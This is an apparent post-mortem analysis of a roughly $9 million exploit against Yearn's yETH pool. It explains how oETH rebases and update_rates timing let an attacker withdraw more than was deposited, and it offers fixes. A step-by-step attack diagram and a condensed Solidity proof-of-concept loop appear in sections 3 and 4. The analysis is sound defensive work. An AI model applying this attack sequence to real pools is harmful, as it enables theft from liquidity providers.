# yETH — Virtual Balance Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-12-10 |
| **Protocol** | yETH (Yearn ETH Pool) |
| **Chain** | Ethereum |
| **Loss** | ~9,000,000 USD |
| **Attacker** | 0xfb63aa935cf0a003335dce9cca03c4f9c0fa4779 |
| **Attack Tx** | [0x53fe7ef1...](https://etherscan.io/tx/0x53fe7ef190c34d810c50fb66f0fc65a1ceedc10309cf4b4013d64042a0331156) |
| **Vulnerable Contract** | [0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81](https://etherscan.io/address/0xCcd04073f4BdC4510927ea9Ba350875C3c65BF81) |
| **Root Cause** | Mismatch between `virtual_balance` and actual balance before/after `update_rates` call, allowing excess withdrawals upon LP redemption |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-12/yETH_exp.sol) |

---

## 1. Vulnerability Overview

Yearn's yETH pool is a protocol that bundles multiple LSTs (Liquid Staking Tokens) into a single Curve-like pool. The pool calculates the value of LP tokens based on `virtual_balance`. When each asset's rate changes before and after an `update_rates` call, a discrepancy arises where `virtual_balance` diverges from the actual balance. The attacker triggered this discrepancy by calling oETH's `rebase` function, then extracted approximately $9 million through repeated liquidity add/remove cycles.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: virtual_balance mismatch before/after update_rates
interface IPool {
    function virtual_balance(uint256 index) external view returns (uint256);
    function supply() external view returns (uint256);

    // After update_rates is called, each asset's rate is updated
    // However, virtual_balance may not be updated immediately
    function update_rates(uint256[] calldata _assets) external;

    function remove_liquidity(
        uint256 _lp_amount,
        uint256[] calldata _min_amounts,
        address _receiver
    ) external;
}

// Calling oETH.rebase() increases oETH's actual balance, but
// the pool's virtual_balance retains the old value since update_rates hasn't been called yet
// → Discrepancy occurs when calculating LP token value → excess withdrawal possible

// ✅ Fix: automatically update rates before remove_liquidity
function remove_liquidity(...) external {
    _update_all_rates(); // Update all rates before withdrawal
    ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[Phase 1: Initial Balance Setup]
  │   ├─[1]─▶ Acquire multiple LST tokens (via flash loan or purchase)
  │   └─[2]─▶ Add initial liquidity to pool
  │
  ├─[Phase 2: Initial rates Update]
  │   └─[3]─▶ Call pool.update_rates()
  │             Synchronize virtual_balance
  │
  ├─[Phase 3: Exploit Cycle (repeated)]
  │   ├─[4]─▶ Call oETH.rebase()
  │   │         └─ oETH actual balance increases (virtual_balance still holds old value)
  │   │
  │   ├─[5]─▶ Call pool.add_liquidity([oETH_amount, ...])
  │   │         └─ Receive LP tokens based on actual balance (favorable terms)
  │   │
  │   ├─[6]─▶ Call pool.update_rates()
  │   │         └─ virtual_balance updated → LP value increases
  │   │
  │   └─[7]─▶ Call pool.remove_liquidity(lp_amount, ...)
  │             └─ Receive excess tokens based on updated virtual_balance
  │
  └─[Phase 4: Final Cleanup]
      └─[8]─▶ Swap all assets to wETH → ~9M USD extracted
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function _executeExploitSequence() internal {
    // Repeat exploit cycle
    for (uint256 i = 0; i < EXPLOIT_ROUNDS; i++) {
        _executePhase1(); // oETH rebase + add liquidity
        _executePhase2(); // update rates + remove liquidity (excess withdrawal)
    }
}

function _executePhase1() internal {
    // [1] oETH rebase: actual balance increases, virtual_balance retains old value
    IOETH(oETH).rebase();

    // [2] Add liquidity based on actual balance (favorable rate)
    uint256[] memory amounts = new uint256[](NUM_ASSETS);
    amounts[oETHIndex] = IERC20(oETH).balanceOf(address(this));
    pool.add_liquidity(amounts, 0, address(this));
}

function _executePhase2() internal {
    // [3] Update rates → LP token value increases
    uint256[] memory rateAssets = new uint256[](NUM_ASSETS);
    pool.update_rates(rateAssets);

    // [4] Remove liquidity based on updated virtual_balance
    // → Receive more tokens than originally deposited (exploiting the discrepancy)
    uint256 lpBalance = IERC20(address(pool)).balanceOf(address(this));
    uint256[] memory minAmounts = new uint256[](NUM_ASSETS);
    pool.remove_liquidity(lpBalance, minAmounts, address(this));
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Virtual balance vs. actual balance mismatch (Virtual Balance Manipulation) |
| **Attack Vector** | oETH rebase + update_rates timing manipulation |
| **Impact Scope** | Pool LP value manipulation → large-scale asset theft |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP Classification** | Price Manipulation / Business Logic |

## 6. Remediation Recommendations

1. **Automatic rates update**: Automatically update all asset rates before executing `add_liquidity` and `remove_liquidity`.
2. **Rebase detection**: Implement hooks to immediately reflect balance changes of rebase tokens like oETH into the pool.
3. **virtual_balance and actual balance consistency check**: Validate that both values match before executing all critical functions.
4. **Rate change cap**: Set an upper bound on the rate of change per single block to prevent abrupt discrepancies.

## 7. Lessons Learned

- When integrating rebase tokens with pools that use price oracles/rates, the synchronization timing between the two values can become a critical vulnerability.
- Internal accounting variables such as `virtual_balance` must always remain synchronized with external state (actual token balances, rebase events).
- The $9 million loss originated from a simple state synchronization flaw rather than a complex mathematical design error.